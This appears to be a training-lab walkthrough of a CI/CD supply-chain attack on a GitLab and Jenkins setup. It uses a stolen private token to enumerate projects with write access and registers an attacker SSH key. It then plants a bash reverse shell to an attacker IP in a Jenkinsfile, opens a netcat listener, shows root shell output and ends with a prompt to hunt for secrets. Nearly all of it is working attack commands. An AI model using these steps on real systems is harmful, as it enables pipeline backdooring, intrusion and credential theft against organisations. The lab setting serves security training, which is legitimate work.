# First we need to find a project that we can hijack
curl  -H 'Content-Type: application/json' https://gitlab.devsecoops.academy/api/v4/projects?private_token=[STOLEN_TOKEN]

# You can simply open the following link
https://{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy/api/v4/projects/?private_token=SYZ3Xt-tFfdHy6Gpd_xy

# Now you look at github documentation (https://docs.gitlab.com/ee/api/access_requests.html) and look for an access level 40 or above within accessible projects
curl -H 'Content-Type: application/json' https://{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy/api/v4/projects/?private_token=SYZ3Xt-tFfdHy6Gpd_xy | jq '.[] | select( .permissions.project_access > 20  ) | { id, name, permissions, visibility, ssh_url_to_repo  }'


# Project 22 is a good candidate, let's look at latest commit
https://{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy/api/v4/projects/22/repository/commits?private_token=SYZ3Xt-tFfdHy6Gpd_xy
https://{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy/api/v4/projects/22/repository/commits/eac7188a309fa39a9ec2ee837b003c8b69fa0b47/statuses?private_token=SYZ3Xt-tFfdHy6Gpd_xy


# First we need to generate a ssh key
ssh-keygen

# Then we need to add our SSH key to the gitlab user
curl -d '{"title":"my_key","key":"'"$(cat ~/.ssh/id_rsa.pub)"'"}' -H 'Content-Type: application/json' https://{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy/api/v4/user/keys?private_token=SYZ3Xt-tFfdHy6Gpd_xy

# Check your key is now there
curl -H 'Content-Type: application/json' https://{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy/api/v4/user/keys?private_token=SYZ3Xt-tFfdHy6Gpd_xy

# Now we clone the repository
git clone git@{PLACEHOLDER_LAB_NAME}-gitlab.devsecoops.academy:Internal_resources/our-awesome-webapp.git
cd our-awesome-webapp/script
vim Jenkinsfile

# Now let's add your malicious code within the pipeline, add the following line within the build step of the Jenkinsfile
sh 'bash -c "bash -i >& /dev/tcp/{PLACEHOLDER_PRIVATE_IP}/4242 0>&1"'

# Dont forget to listen on your kali workstation
nc -lvp 4242

#If it works, you should see something like this
### connect to [XXXXXX] from [XXXX] [XXXXX] 44632
### bash: cannot set terminal process group (7): Inappropriate ioctl for device
### bash: no job control in this shell
### root@1dd43ae49e1f:/home/jenkins/agent/workspace/Our awesome webapp#

# Then look for secrets !
